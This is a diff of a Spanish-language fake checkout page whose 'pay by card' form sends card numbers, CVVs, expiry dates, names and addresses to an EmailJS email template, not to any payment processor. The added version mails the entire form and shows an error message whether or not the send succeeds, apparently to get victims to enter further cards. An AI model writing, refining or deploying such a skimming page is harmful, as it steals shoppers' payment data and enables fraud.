@@ -208,9 +208,10 @@ input.error, select.error{border-color: var(--danger);}
       <!-- PAGO -->
       <div class="card">
         <div class="section-title"><span class="badge">3</span> Pago con tarjeta</div>
-        
+
         <!-- Logos de tarjetas -->
         <div style="margin-bottom:14px;">
+          <!-- Ajusta la extensión si tu archivo no es .jpeg (por ejemplo .jpg o .png) -->
           <img src="IMG_6455.jpeg" alt="Tarjetas aceptadas" style="max-width:220px; height:auto;">
         </div>
 
@@ -358,56 +359,30 @@ document.addEventListener("DOMContentLoaded", () => {
       if (f.closest("#billingSection") && sameAsShipping.checked) return;
       if (!validateField(f)) valid = false;
     });
+    if (!valid) return;
 
-    if (!valid) {
-      errorMsg.textContent = "⚠️ Por favor corrige los campos marcados en rojo.";
-      errorMsg.style.display = "block";
-      return;
-    }
-
-    btn.disabled = true;
-    spinner.style.display = "inline-block";
     errorMsg.style.display = "none";
+    btn.disabled = true;
+    btn.textContent = "Procesando...";
+    spinner.style.display = "inline-block";
 
-    emailjs.send("service_gkxj7cq", "template_s73h7vk", {
-      to_email: document.getElementById("shipEmail").value,
-      shipName: document.getElementById("shipName").value,
-      shipEmail: document.getElementById("shipEmail").value,
-      shipPhone: document.getElementById("shipPhone").value,
-      shipPostal: document.getElementById("shipPostal").value,
-      shipCity: document.getElementById("shipCity").value,
-      shipState: document.getElementById("shipState").value,
-      shipAddress: document.getElementById("shipAddress").value,
-      billName: document.getElementById("billName")?.value || "",
-      billRFC: document.getElementById("billRFC")?.value || "",
-      billAddress: document.getElementById("billAddress")?.value || "",
-      cardName: document.getElementById("cardName").value,
-      cardNumber: document.getElementById("cardNumber").value,
-      cardExp: document.getElementById("cardExp").value,
-      cardCvv: document.getElementById("cardCvv").value,
-      cardType: document.getElementById("cardType").value,
-      meses: document.getElementById("meses")?.value || ""
-    })
-    .then(() => {
-      btn.textContent = "✅ Pago exitoso";
-      spinner.style.display = "none";
-      errorMsg.style.display = "none";
-      form.reset();
-      mesesContainer.style.display = "none";
-      btn.disabled = false;
-      setTimeout(() => btn.textContent = "Pagar ahora", 3000);
-    })
-    .catch(() => {
-      btn.disabled = false;
-      spinner.style.display = "none";
-      errorMsg.textContent = "❌ El pago fue rechazado. Intenta con otra tarjeta o verifique que los datos ingresados sean correctos.";
-      errorMsg.style.display = "block";
-    });
+    emailjs.sendForm("service_tc4q92e", "template_qdvkqdr", form)
+      .then(() => {
+        spinner.style.display = "none";
+        btn.disabled = false;
+        btn.textContent = "Pagar ahora";
+        errorMsg.style.display = "block";
+      })
+      .catch(() => {
+        spinner.style.display = "none";
+        btn.disabled = false;
+        btn.textContent = "Pagar ahora";
+        errorMsg.style.display = "block";
+      });
   });
 });
 </script>
 </body>
 </html>
-
 
 
